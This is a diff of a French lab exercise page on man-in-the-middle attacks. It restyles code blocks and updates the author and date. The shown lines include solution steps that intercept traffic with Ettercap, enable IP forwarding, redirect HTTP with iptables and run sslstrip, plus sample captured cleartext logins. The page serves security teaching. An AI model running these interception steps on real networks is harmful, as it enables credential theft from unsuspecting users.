@@ -62,7 +62,7 @@
         <summary>Afficher / Masquer la Solution</summary>
         <div class="solution-content">
             <p><strong>Étapes de l'attaque :</strong></p>
-            <pre><code># 1. Lancer Ettercap en mode graphique
+            <pre style="background-color:#000; border-radius:5px; padding:10px; font-family:monospace;"><code># 1. Lancer Ettercap en mode graphique
 sudo ettercap -G
 
 # 2. Scanner le réseau pour trouver les machines
@@ -109,7 +109,7 @@ ping [IP_DU_SERVEUR]
                 <li>Sur la machine **attaquante**, observez la fenêtre d'Ettercap. Vous verrez apparaître en clair les informations de connexion capturées, car elles ont transité sans aucun chiffrement.</li>
             </ol>
             <p><strong>Exemple de ce que vous verriez dans Ettercap :</strong></p>
-            <pre><code>HTTP: [IP_CLIENT]:... -> [IP_SERVEUR]:80
+            <pre style="background-color:#000; border-radius:5px; padding:10px; font-family:monospace;"><code>HTTP: [IP_CLIENT]:... -> [IP_SERVEUR]:80
 USER: admin PASS: password123 INFO: /login.php
 CONTENT: username=admin&password=password123</code></pre>
         </div>
@@ -126,7 +126,7 @@ CONTENT: username=admin&password=password123</code></pre>
         <div class="solution-content">
             <p><strong>Mise en place :</strong></p>
             <p>Cette attaque nécessite une configuration supplémentaire sur la machine attaquante pour rediriger le trafic.</p>
-            <pre><code># 1. Activer la redirection de port sur la machine Kali
+            <pre style="background-color:#000; border-radius:5px; padding:10px; font-family:monospace;"><code># 1. Activer la redirection de port sur la machine Kali
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # 2. Configurer iptables pour rediriger le trafic HTTP (port 80) vers un port d'écoute local (ex: 8080)
@@ -148,8 +148,8 @@ sslstrip -l 8080
     <h2><i class="fas fa-info-circle" aria-hidden="true"></i>Informations sur le document original</h2>
     <p>
         <b>Titre :</b> Attaques réseaux Man in the Middle (MitM)<br>
-        <b>Auteurs :</b> Anthony Magniat (Club Kr[Hack]en)<br>
-        <b>Date de publication :</b> Non spécifiée
+        <b>Auteurs :</b> Anthony Magniat<br>
+        <b>Date de publication :</b> 26 mai 2023
     </p>
 </section>
 
